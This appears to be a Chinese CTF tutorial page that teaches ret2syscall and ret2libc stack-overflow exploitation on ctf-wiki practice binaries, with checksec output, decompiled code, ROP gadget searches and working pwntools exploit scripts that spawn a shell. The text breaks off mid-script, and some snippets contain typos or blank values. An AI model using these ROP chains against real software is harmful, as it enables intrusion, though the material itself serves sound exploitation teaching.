<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b'a'*offest+p32(eax_addr)+p32(0x0b)+p32( edx_ecx_ebx_addr)+p32(0x0)+p32(0x0)+p32(binsh_addr)+p32(int0x80_addr)</span><br></pre></td></tr></table></figure>



<p><font style="color:rgba(0, 0, 0, 0.87);">64位binary下的shell：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax:0x3b  # 59</span><br><span class="line">rdi:bin_sh_addr</span><br><span class="line">rsi:0</span><br><span class="line">rdx:0</span><br><span class="line">rcx:0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">payload</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b'a'*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(0x3b)+p64(0x0)+p64(0X0)+p64(rsi_addr)+p64(0x0)+p64(syscall_addr)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">checksec</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] '/home/kali/Desktop/pwn'</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">源程序为 32 位，开启了 NX 保护。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">    gets(&amp;v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">和之前一样，存在栈溢出，溢出点 v4,偏移量：offset  = 0x64+4+4+4</font></p>
<p>发现 /bin/sh 字符串以及它的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:080BE408 2F 62 69 6E 2F 73 68 00       aBinSh db '/bin/sh',0                   ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">没有 system 或者 execve 函数，这时候我们就要利用如下系统调用来获取 shell：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">首先，寻找 eax 的 gadget</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">输入：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">选择：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">类似的，我们可以得到控制其它寄存器的 gadgets</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">输入：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only 'pop|ret' | grep 'ebx'</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret      # 直接给出了剩余的三个寄存器的 gadget</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">选择：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>



<p><strong>int 0x80:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only 'int'</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─$ ROPgadget --binary pwn --only 'int'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080890b5 : int 0xcf</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">上面通过IDA找到了 /bin/sh 的地址，也可以通过</font></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --string '/bin/sh'</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ ROPgadget --binary pwn  --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">eax = <span class="number">0x080bb196</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*offset + p32(eax) + p32(<span class="number">0xb</span>) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">64位程序和32位大致一样，不同的就是64位程序通过“syscall”触发中断，32位程序是通过“int 0x80”</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ROP gadgets：</font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">rax_rdx_rbx:</font></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">'pop|ret'</span> | grep <span class="string">'rax'</span></span><br></pre></td></tr></table></figure>

<p><strong>rdi:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only 'pop|ret' | grep 'rdi'</span><br></pre></td></tr></table></figure>

<p><strong>rsi:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only 'pop|ret' | grep 'rsi'</span><br></pre></td></tr></table></figure>

<p><strong>binsh:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --string '/bin/sh'</span><br></pre></td></tr></table></figure>

<p><strong>syscall:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn | grep 'syscall'</span><br></pre></td></tr></table></figure>



<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">offset = </span><br><span class="line">rax_rdx_rbx_addr =</span><br><span class="line">rdi_addr =</span><br><span class="line">rsi_addr =</span><br><span class="line">binsh_addr =</span><br><span class="line">syscall_addr =</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'a'</span>*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0X0</span>)+p64(rsi_addr)+p64(<span class="number">0x0</span>)+p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h2 id="VKYue"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc</font></h2>
<font style="color:rgba(0, 0, 0, 0.87);">libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h3 id="nySln"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc1</font></h3>
system 和 /bin/sh 都存在。



<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] '/home/kali/Desktop/pwn'</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看到在执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">然后寻找 system 函数和字符串 /bin/sh</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">/bin/sh：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:08048720 2F 62 69 6E 2F 73 68 00       aBinSh db '/bin/sh',0                   ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">system：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:08048303 73 79 73 74 65 6D 00          aSystem db 'system',0                   ; DATA XREF: LOAD:08048218↑o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">那么，我们直接返回该处，即执行 system 函数。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*offset + p32(system_plt) + p32(<span class="number">0x0</span>) + p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(0, 0, 0);">32位的分布是这样子的，返回地址+下一次的返回地址+参数1+参数2+…</font></p>
<p><font style="color:rgb(0, 0, 0);">我们下一次返回地址是啥都行，因为我们拿到shell就跑了，可以直接为0，也可以是真实的地址（最好是）</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h3 id="bdt8n"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc2</font></h3>
没有 /bin/sh 。



<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] '/home/kali/Desktop/pwn'</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something surprise here, but I don't think it will work."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What do you think ?"</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">system：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0804831A 73 79 73 74 65 6D 00          aSystem db 'system',0                   ; DATA XREF: LOAD:08048228↑o</span><br></pre></td></tr></table></figure>

<p>没有找到 /bin/sh </p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>尽管没有 /bin/sh ，但程序中调用了 gets 函数，如此，字符串 bin/sh 可以通过 gets 函数输入。</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">那么，接下来需要解决的问题就是，字符串 /bin/sh 通过 gets 函数输入到哪里进行存储？</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">不能在溢出点 s 存储，因为在溢出位置输入字符串，然后再劫持回来执行system函数，会覆盖数据。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">查看 bss 段的 buf2 是否可读、可写、可执行</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 依次输入</span><br><span class="line">gdb ret2libc2</span><br><span class="line">start</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>

<p>找到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">确实可读、可写、可执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">sys_addr=<span class="number">0x8048490</span></span><br><span class="line">gets_addr=<span class="number">0x8048460</span></span><br><span class="line">bss_addr=<span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*offset +p32(gets_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)    <span class="comment"># 先发送构造好的 payload，触发缓冲区溢出，覆盖返回地址，实现函数链调用。</span></span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)  <span class="comment"># 再发送字符串 /bin/sh，此字符串通过 gets() 写入到 bss 段（bss_addr），最终作为 system() 的参数调用，打开 shell。</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<ul>
<li><font style="color:rgba(0, 0, 0, 0.87);">b’a’*112：填充 112 个字符以覆盖缓冲区（及覆盖掉函数调用时保存的 EBP），为覆盖返回地址做准备。</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(gets_addr)：覆盖返回地址，使得函数返回时跳转到 gets() 函数。（后面的发送 ‘/bin/sh’ 就会使用这个 gets 函数）</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(sys_addr)：gets() 执行完毕后返回时，跳转到 system() 函数。</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(bss_addr)：（第一次）：作为 gets() 的参数，即 gets() 会把输入写入这个地址。（也就是 /bin/sh ）</font></li>
<li><font style="color:rgba(0, 0, 0, 0.87);">p32(bss_addr)：（第二次）：作为 system() 的参数，即 system(bss_addr) 将执行存储在 bss_addr 处的 “/bin/sh”。</font></li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h3 id="tdUNO"><font style="color:rgba(0, 0, 0, 0.87);">ret2libc3</font></h3>
<font style="color:rgba(0, 0, 0, 0.87);">system 和 /bin/sh 都不存在。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">首先，我们检查一下程序的安全保护：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] '/home/kali/Desktop/pwn'</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">32位小端序，开启了NX保护</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No surprise anymore, system disappeard QQ."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can you find it !?"</span>);</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">依旧是执行 gets 函数的时候出现了栈溢出，偏移量为：0x64+4+4+4。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>检查后发现没有 system 函数和字符串 /bin/sh 。这时我们需要在函数动态绑定的 libc 中找，例如经常使用的</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">system、/bin/sh字符串。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>找 libc.so 版本：</p>
<ul>
<li><font style="color:rgba(0, 0, 0, 0.87);"></font><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li>
<li><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p>总的来说：</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘/bin/sh’)</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">"!?"</span>,payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span 